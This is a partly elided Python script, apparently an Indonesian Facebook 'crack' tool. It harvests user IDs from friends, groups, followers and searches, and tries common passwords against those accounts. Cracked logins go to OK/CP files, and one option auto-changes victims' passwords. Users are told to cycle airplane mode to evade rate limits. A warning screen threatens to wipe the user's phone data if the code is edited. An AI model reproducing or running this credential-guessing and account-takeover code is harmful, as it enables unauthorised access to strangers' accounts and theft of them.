    ...
    if pmu in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu_log()
        ...
        with requests.Session() as xyz:
            try:
                ...
                menu()
            except requests.exceptions.ConnectionError:_dvanme_ferly_('%s║'%(O));jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P));_ferly_exit_()
...
def menu():
    ...
    _update_ = 'V1.6'
    _dvanme_ferly_('%s╔══[ %sSelamat Datang %s %s]'%(O,P,n,O))
    _dvanme_ferly_('%s║'%(O))
    _dvanme_ferly_('%s╠══[%s•%s] %sID : %s'%(O,P,O,P,i))
    _dvanme_ferly_('%s╠══[%s•%s] %sIP : %s'%(O,P,O,P,ip))
    _dvanme_ferly_('%s╠══[%s•%s] %sToken/Cookies : %sYa%s/%s'%(O,P,O,P,H,P,status_cookies))
    _dvanme_ferly_('%s║'%(O))
    _dvanme_ferly_('%s╠══[%s•%s] %sStatus : %sFree'%(O,P,O,P,O))
    _dvanme_ferly_('%s╠══[%s•%s] %sVersi : %sOpen Source'%(O,P,O,P,O))
    _dvanme_ferly_('%s╠══[%s•%s] %sNama : %sFree User'%(O,P,O,P,O))
    _dvanme_ferly_('%s╠══[%s•%s] %sEmail : %sNull'%(O,P,O,P,O))
    _dvanme_ferly_('%s╠══[%s•%s] %sKey : %sNull'%(O,P,O,P,O))
    _dvanme_ferly_('%s╠══[%s•%s] %sPembelian : %sNull'%(O,P,O,P,O))
    _dvanme_ferly_('%s╠══[%s•%s] %sKedaluwarsa : %sNull'%(O,P,O,P,O))
    _dvanme_ferly_('%s║'%(O))
    _dvanme_ferly_('%s╠══[%s01%s] %sCrack ID Teman/Publik'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s02%s] %sCrack ID Pengikut'%(O,P,O,W))
    _dvanme_ferly_('%s╠══[%s03%s] %sCrack ID Pencarian Nama'%(O,P,O,W))
    _dvanme_ferly_('%s╠══[%s04%s] %sCrack ID Daftar Pesan'%(O,P,O,W))
    _dvanme_ferly_('%s╠══[%s05%s] %sCrack ID Likers Post'%(O,P,O,W))
    _dvanme_ferly_('%s╠══[%s06%s] %sCrack ID Komentar Post'%(O,P,O,W))
    _dvanme_ferly_('%s╠══[%s07%s] %sCrack ID Anggota Grup'%(O,P,O,W))
    _dvanme_ferly_('%s╠══[%s08%s] %sCrack ID Dari File'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s09%s] %sCrack ID Dari Email'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s10%s] %sCrack ID Random'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s11%s] %sCrack Username'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s12%s] %sCrack ID Dari Hashtag'%(O,P,O,W))
    _dvanme_ferly_('%s╠══[%s13%s] %sCrack ID Dari Beranda'%(O,P,O,W))
    _dvanme_ferly_('%s╠══[%s14%s] %sCrack ID Pertemanan Masuk'%(O,P,O,W))
    _dvanme_ferly_('%s╠══[%s15%s] %sCrack ID Pertemanan Keluar'%(O,P,O,W))
    _dvanme_ferly_('%s╠══[%s16%s] %sMengambil Jumlah Teman'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s17%s] %sCek Opsi Hasil Crack'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s18%s] %sCek Hasil Crack'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s19%s] %sUser Agent'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s00%s] %sLog Out'%(O,P,O,P))
...
def ugen_hp():
    ...
    _dvanme_ferly_('%s╠══[%s1%s] %sXiaomi'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s2%s] %sNokia'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s3%s] %sAsus'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s4%s] %sHuawei'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s5%s] %sVivo'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s6%s] %sOppo'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s7%s] %sSamsung'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s8%s] %sWindows'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s9%s] %sLenovo'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s10%s] %sIphone'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s11%s] %sDefault'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s12%s] %sFacebook'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s13%s] %sSonny'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s14%s] %sReadmi'%(O,P,O,P))
    ...
    elif pc in ['9','09']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_lenovo);ugent.close()
    elif pc in ['10','010']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_iphone);ugent.close()
    elif pc in ['11','011']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_default);ugent.close()
    elif pc in ['12','012']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_fb);ugent.close()
    elif pc in ['13','013']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_sony);ugent.close()
    elif pc in ['14','014']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_redmi);ugent.close()
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    jalan("%s╠══[ %sBerhasil Mengganti User Agent %s]"%(O,P,O));_dvanme_ferly_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()

### Dump ID From Public
def publik(token):
    try:
        _dvanme_ferly_('%s╠══[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(O,P,O,P))
        ...
        try:
            ...
            ob = _js_lo_(pb.text)
            _dvanme_ferly_ ('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,ob['name']))
        except (KeyError,IOError):
            _dvanme_ferly_('%s║'%(O))
...
def followers(cookies):
    _query_ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan ID Target : '%(O,P,O,P));_dvanme_ferly_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));_file_ = _query_+'.json';_url_dev_ = 'https://mbasic.facebook.com/subscribe/lists/?id=' + _query_;_file_ = (_query_+'.json').replace(' ','_')
...
class dump_grup:
    ...
    def main_group(self, url_dev):
        ...
        else:_dvanme_ferly_("%s╠══[%s•%s] %sKamu Tidak Bergabung Dalam Grup Manapun"%(O,P,O,P));self.manual()
    def saya(self):
        self.fl=(self.id)
        try:os.remove(self.fl)
        except:pass
        _dvanme_ferly_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P))
        try: 
    ...
    def manual(self):
        ...
        if id=="":jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
            ...
            if "konten tidak" in r.find("title").text.lower():jalan('%s╚══[%s!%s] %sGrup Privat Atau ID Salah'%(M,P,M,P));menu()
                ...
                self.listed={"id":id,"name":r.find("title").text};self.f(id);_dvanme_ferly_('%s║'%(O));_dvanme_ferly_("%s╠══[%s•%s] %sNama : %s"%(O,P,O,P,self.listed.get("name")));xd = _cici_dapunta_('%s╠══[%s•%s] %sDump ID/Username? [i/u] : '%(O,P,O,P));_dvanme_ferly_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P))
    ...
    def search(self):
        ...
        if q=='':self.search()
            ...
            for e,i in enumerate(self.glist):
                if q in i.get("name").lower():whitelist.append(i);_dvanme_ferly_('%s╠══[%s%s%s] %s%s'%(O,P,len(whitelist),O,P,i.get("name").replace(q,"%s"%(q))))
...
def dump_name(_dapunta_):
    _dvanme_ferly_('%s╠══[%s•%s] %sContoh : Dapunta,Rizal,Angga'%(O,P,O,P));__name__ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Nama : '%(O,P,O,P)).split(',');_file_ = 'dump_name.json'
    try:os.remove(_file_)
    except:pass
...
def cari_nama(_file_,_cookies_,_url_):
    ...
    for _dapunta_dev_ in _req_ses_dev_.find_all("a",href=True):
        _dvanme_ferly_ ("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
...
def exec_email(__query__,_domain_,_limit_awal_,_limit_akhir_,_file_):
    ...
    _dvanme_ferly_("%s╠══[%s•%s] %sTotal ID : %s"%(O,P,O,P,str(len(_buka_file_))))
    return crack(_file_)
...
def _main_random_():
    ...
    _dvanme_ferly_('%s╠══[%s01%s] %sDump ID Old'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s02%s] %sDump ID New'%(O,P,O,P))
    _cok_ = input('%s╠══[%s••%s] %sPilih : '%(O,P,O,P))
    _dvanme_ferly_('%s║'%(O))
    if _cok_ in ['1','01']:_random_old_(file);_dvanme_ferly_('');return set_pass_dev(file)
    elif _cok_ in ['2','02']:_random_new_(file);_dvanme_ferly_('');return set_pass_dev(file)
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
def _random_old_(_file_):
    try:
        ...
        _dvanme_ferly_('%s╠══[%s•%s] %sContoh : 1 / 12 / 15 / 18 / 19'%(O,P,O,P))
...
def _random_new_(_file_):
    try:
        open(_file_,'a')
        _jum_ = int(input("%s╠══[%s•%s] %sMasukkan Jumlah : "%(O,P,O,P)))
        _dvanme_ferly_('%s╠══[%s•%s] %sContoh : 10005 / 100005 / 1000005'%(O,P,O,P))
        _dig_ = input('%s╠══[%s•%s] %sMasukkan ID Depan : '%(O,P,O,P))
...
def generate4(_cici_):
    ...
    return _dapunta_
def tambah_pass():
    _dvanme_ferly_('%s║'%(O));_dvanme_ferly_('%s╠══[%s•%s] %sContoh : sayang,bismillah,123456,786786'%(O,P,O,P));cuy = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Pass Tambahan Manual [1 Kata] : '%(O,P,O,P));gh = _dapunta_dapunta_('pass.txt','w');gh.write(cuy);gh.close
def tambah_pass_angka():
    _dvanme_ferly_('%s╠══[%s•%s] %sContoh : 321,786,gaming,ganteng'%(O,P,O,P));coy = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Pass Tambahan Dibelakang Nama : '%(O,P,O,P));xy = _dapunta_dapunta_('passangka.txt','w');xy.write(coy);xy.close
        ...
        if len(_check_opsi_)==0:
            if "Lihat detail login yang ditampilkan. Ini Anda?" in _title_dev_:
                if _auto_change_pass_ == 'Ya':change_pass(user,_req_ses_,_response_,link_2)
                    ...
                    if cek_pilih_opsi == 'Ya':_dvanme_ferly_(format);_dvanme_ferly_('   %s• %sAkun One Tap'%(H,P));_dvanme_ferly_("")
                    else:_dvanme_ferly_(format);_dvanme_ferly_('   %s• %sAkun One Tap'%(H,P))
            else:pass
            ...
            if cek_pilih_opsi == 'Ya':
                ...
                jumop = ('%s   Ditemukan %s Opsi : '%(P,str(len(jumlah_opsi))));_dvanme_ferly_(format);_dvanme_ferly_(jumop+"".join(jumlah_opsi));_dvanme_ferly_("")
            else:_dvanme_ferly_(format)
    else:
        if 'hasil' in cek_dev_opsi:_dvanme_ferly_(format);_dvanme_ferly_("%s[%s!%s] %sPassword Telah Diubah"%(M,P,M,P));_dvanme_ferly_('')
        else:_dvanme_ferly_(format)
...
def cek_apk(h_ok,_dapunta_):
    ...
    if cek_pilih_opsi == 'Ya':_dvanme_ferly_(h_ok+''.join(apk));_dvanme_ferly_('')
    elif cek_pilih_opsi == 'Tidak':_dvanme_ferly_(h_ok+''.join(apk))
...
class crack:
    def __init__(self,files):
        ...
        while True:
            pilih_methode();_dvanme_ferly_('%s║'%(O));_dvanme_ferly_('%s╠══[%s•%s] %sCrack Dengan Password Default/Manual [d/m]'%(O,P,O,P))
            ...
            if _pilih_sandi_=="":jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
                ...
                try:
                    while True:
                        ...
                        except Exception as e:_dvanme_ferly_ ("   %s"%(e));continue
                    self.fl = []
                    for i in self.fs:
                        try:self.fl.append({"id":i.split("•")[0]})
                        except:continue
                except Exception as e:_dvanme_ferly_(("   %s"%e));continue
                _dvanme_ferly_('%s╠══[%s•%s] %sContoh : sayang,bismillah,123456'%(O,P,O,P));self.pwlist();break
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    if fl.get("id") in files_ok:pass
                        ...
                        else:_dvanme_ferly_("\r%s[%sOK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
...
def set_pass_dev(_file_):
    ...
    try:
        pilih_methode()
        _dvanme_ferly_('%s║'%(O))
        _dvanme_ferly_('%s╠══[%s•%s] %sContoh : 123456,123456789,123123'%(O,P,O,P))
...
def crack_langsung_dev(_user_id_,_password_):
    ...
    try:
        ...
        _putar_ += 1
        _dvanme_ferly_("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,_user_id_,O,P,str(_putar_),len(_user_id_dev_),O,P,len(ok),O,P,len(cp),O,P), end='');sys.stdout.flush()
    except:pass

### Mendapat Jumlah Teman Target
def teman_target():
    it = _cici_dapunta_('%s╠══[%s•%s] %sID Target : '%(O,P,O,P))
    try:token = _dapunta_dapunta_('token.txt','r').read();mm = _req_get_('https://graph.facebook.com/%s?access_token=%s'%(it,token));nn = _js_lo_(mm.text);_dvanme_ferly_ ('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,nn['name']))
    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));menu_log()
    tt=[];te=[];lim = _cici_dapunta_('%s╠══[%s•%s] %sLimit Dump : '%(O,P,O,P));_dvanme_ferly_('%s║%s'%(O,P));ada = _req_get_('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(it,lim,token));idi = _js_lo_(ada.text)
...
def hasil():
    clear()
    jalan('%s╔══[ %sHasil Crack %s]'%(O,P,O));_dvanme_ferly_('%s║'%(O));_dvanme_ferly_('%s╠══[%s1%s] %sCek Hasil OK'%(O,P,O,P));_dvanme_ferly_('%s╠══[%s2%s] %sCek Hasil CP'%(O,P,O,P));ch = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    if ch in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    elif ch in ['1','01','001','a']:
        try:
            okl = os.listdir("OK");_dvanme_ferly_('%s║'%(O));_dvanme_ferly_('%s╠══[%s Hasil Crack Yang Tersimpan Di File OK %s]'%(O,P,O));_dvanme_ferly_('%s║'%(O))
            for file in okl:_dvanme_ferly_('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
            _dvanme_ferly_('%s║'%(O));files = _cici_dapunta_('%s╚══[%s•%s] %sMasukkan Nama File : '%(O,P,O,P));_dvanme_ferly_('')
        ...
        try:
            ...
            for file in cpl:_dvanme_ferly_('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
            _dvanme_ferly_('%s║'%(O));files = _cici_dapunta_('%s╚══[%s•%s] %sMasukkan Nama File : '%(O,P,O,P));_dvanme_ferly_('')
            if files == "":jalan('%s═══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));hasil()
            try:
                ppp = _dapunta_dapunta_("CP/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');_dvanme_ferly_('%s[%sCP%s] %s'%(O,P,O,yyy))
                del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "");_dvanme_ferly_('\n%s╔══[%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s Akun'%(O,P,O,P,del1,len(ppp)))
            except:_dvanme_ferly_('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
        except:_dvanme_ferly_('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    _dvanme_ferly_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
...
def cek_hasil():
    ...
    _dvanme_ferly_("");_dvanme_ferly_('%s╔══[%s•%s] %sProses Pengecekan Selesai'%(O,P,O,P));_dvanme_ferly_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
...
def var_menu():
    ...
    _dvanme_ferly_('%s╠══[%s4%s] %sCek Hasil Crack'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s5%s] %sCek Opsi Hasil Crack'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s0%s] %sKeluar'%(O,P,O,P))
    _dvanme_ferly_('%s║'%(O))
def tutor_crack():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
...
def var_ugen():
    ...
    _dvanme_ferly_("%s╠══[%s2%s] %sGanti User Agent %s(%sManual%s)"%(O,P,O,P,O,P,O))
    _dvanme_ferly_("%s╠══[%s3%s] %sGanti User Agent %s(%sSesuaikan HP%s)"%(O,P,O,P,O,P,O))
    _dvanme_ferly_("%s╠══[%s4%s] %sHapus User Agent"%(O,P,O,P))
    _dvanme_ferly_("%s╠══[%s5%s] %sCek User Agent"%(O,P,O,P))
    _dvanme_ferly_("%s╠══[%s0%s] %sKembali"%(O,P,O,P))
def start_method():
    _dvanme_ferly_('%s║'%(O))
    _dvanme_ferly_('%s╠══[%s1%s] %sMetode Api V1'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s2%s] %sMetode Api V2'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s3%s] %sMetode Mbasic V1'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s4%s] %sMetode Mbasic V2'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s5%s] %sMetode Mobile FB V1'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s6%s] %sMetode Mobile FB V2'%(O,P,O,P))
def start_methodezz():
    _dvanme_ferly_('%s║'%(O))
    _dvanme_ferly_('%s╠══[%s1%s] %sCrack Cepat %s[%sHasil Sedikit%s]'%(O,P,O,P,O,P,O))
    _dvanme_ferly_('%s╠══[%s2%s] %sCrack Lambat %s[%sHasil Banyak%s]'%(O,P,O,P,O,P,O))
    _dvanme_ferly_('%s╠══[%s3%s] %sCrack Sangat Lambat %s[%sHasil Lebih Banyak%s]'%(O,P,O,P,O,P,O))
    _dvanme_ferly_('%s╠══[%s4%s] %sCrack Password Gabungan'%(O,P,O,P))
def started():
    _dvanme_ferly_('%s║'%(O))
    _dvanme_ferly_('%s╠══[%s•%s] %sCrack Sedang Berjalan...'%(O,P,O,P))
    _dvanme_ferly_('%s╠══[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.txt'%(O,P,O,P,tanggal))
    _dvanme_ferly_('%s╠══[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.txt'%(O,P,O,P,tanggal))
    _dvanme_ferly_('%s╚══[%s•%s] %sAktifkan Mode Pesawat [5 Detik Saja] Setiap 5 Menit\n'%(O,P,O,P))
def kata_buat_perecode():
    clear()
    _dvanme_ferly_('%s╔══[ %sPeringatan/Warning %s]'%(M,P,M))
    _dvanme_ferly_('%s║'%(M))
    _dvanme_ferly_('%s╠══[ %sIndonesia %s]'%(M,P,M))
    _dvanme_ferly_('%s║   • %sAnda Tidak Bisa Mengubah SC Ini'%(M,P))
    _dvanme_ferly_('%s║   • %sTanpa Seizin Author'%(M,P))
    _dvanme_ferly_('%s║   • %sSetelah Peringatan Ini Muncul'%(M,P))
    _dvanme_ferly_('%s║   • %sBerarti Anda Telah Mengubah Isi SC Ini'%(M,P))
    _dvanme_ferly_('%s║   • %sKemudian Data Di HP Anda Akan Terhapus'%(M,P))
    _dvanme_ferly_('%s║   • %sJangan Sekali-Sekali Melanggar Hak Cipta'%(M,P))
    _dvanme_ferly_('%s║   • %sAnda Harus Membeli Lisensi Untuk Premium'%(M,P))
    _dvanme_ferly_('%s║   • %sTidak Ada Yang Gratis'%(M,P))
    _dvanme_ferly_('%s║   • %sStop Recode !!!'%(M,P))
    _dvanme_ferly_('%s║   • %sTerima Kasih'%(M,P))
    _dvanme_ferly_('%s║'%(M))
    _dvanme_ferly_('%s╠══[ %sEnglish %s]'%(M,P,M))
    _dvanme_ferly_("%s║   • %sYou Can't Change This SC"%(M,P))
    _dvanme_ferly_("%s║   • %sWithout Author's Permission"%(M,P))
    _dvanme_ferly_('%s║   • %sAfter This Warning Appears'%(M,P))
    _dvanme_ferly_('%s║   • %sMeans You Have Changed The Contents Of This SC'%(M,P))
    _dvanme_ferly_('%s║   • %sThen The Data On Your Phone Will Be Deleted'%(M,P))
    _dvanme_ferly_('%s║   • %sNever Infringe Copyright'%(M,P))
    _dvanme_ferly_('%s║   • %sNothing is free'%(M,P))
    _dvanme_ferly_('%s║   • %sStop Recode !!!'%(M,P))
    _dvanme_ferly_('%s║   • %sThank You'%(M,P))
    _dvanme_ferly_('%s║'%(M))
